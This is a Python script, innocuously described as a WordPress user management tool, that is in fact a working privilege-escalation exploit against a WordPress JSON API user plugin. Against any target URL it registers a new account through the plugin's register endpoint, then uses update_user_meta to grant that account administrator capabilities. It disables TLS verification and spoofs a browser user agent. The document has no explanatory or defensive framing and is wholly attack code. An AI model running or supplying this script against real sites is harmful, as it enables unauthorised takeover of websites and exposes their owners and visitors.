#!/usr/bin/env python3
import argparse
import requests
import json
import os
from getpass import getpass

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy if needed
http_proxy = ""
os.environ['HTTP_PROXY'] = http_proxy
os.environ['HTTPS_PROXY'] = http_proxy

user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
headers = {'User-Agent': user_agent}

def get_nonce(url, controller, method):
    nonce_url = f"{url}/api/get_nonce/?controller={controller}&method={method}"
    response = requests.get(nonce_url, headers=headers, verify=False, timeout=30)
    if response.status_code == 200:
        nonce_data = response.json()
        return nonce_data.get("nonce")
    else:
        print(f"Failed to get nonce: {response.status_code} - {response.text}")
        return None

def reg_user(url, username, password):
    nonce = get_nonce(url, "user", "register")
    if not nonce:
        return None

    register_url = f"{url}/api/user/register/"
    params = {
        "username": username,
        "nonce": nonce,
        "display_name": "test",
        "notify": "both",
        "user_pass": password,
        "insecure": "cool",
        "email": "test@test.com"
    }
    register_response = requests.get(register_url, params=params, headers=headers, verify=False, timeout=30)

    if register_response.status_code == 200:
        register_data = register_response.json()
        print("Registration Response:")
        print(json.dumps(register_data, indent=4))
        return register_data.get("cookie")
    else:
        print(f"Failed to register user: {register_response.status_code} - {register_response.text}")
        return None

def update_user(url, cookie_auth, username, password):
    nonce = get_nonce(url, "user", "update_user_meta")
    if not nonce:
        return

    update_url = f"{url}/api/user/update_user_meta/"
    params = {
        "meta_key": "wp_capabilities",
        "meta_value[administrator]": "1",
        "insecure": "cool",
        "cookie": cookie_auth,
        "nonce": nonce
    }
    update_response = requests.get(update_url, params=params, headers=headers, verify=False, timeout=30)
    if update_response.text == '{"status":"ok","updated":true}':
       print(f"A new user with Administrator rights should of been now registered on {url} with the username {username} and password of {password}")
    else:
       print("Error: "+update_response.text+"")

def main():
    parser = argparse.ArgumentParser(description="WordPress User Management Script")
    parser.add_argument("-u", "--url", help="Website URL", required=True)
    parser.add_argument("-un", "--username", help="WordPress username")
    parser.add_argument("-p", "--password", help="WordPress password")
    args = parser.parse_args()

    if not args.username:
        args.username = getpass("Enter the WordPress Username: ")
    if not args.password:
        args.password = getpass("Enter the WordPress password: ")

    cookie_auth = reg_user(args.url, args.username, args.password)
    if cookie_auth:
        update_user(args.url, cookie_auth,  args.username, args.password)


if __name__ == "__main__":
    main()
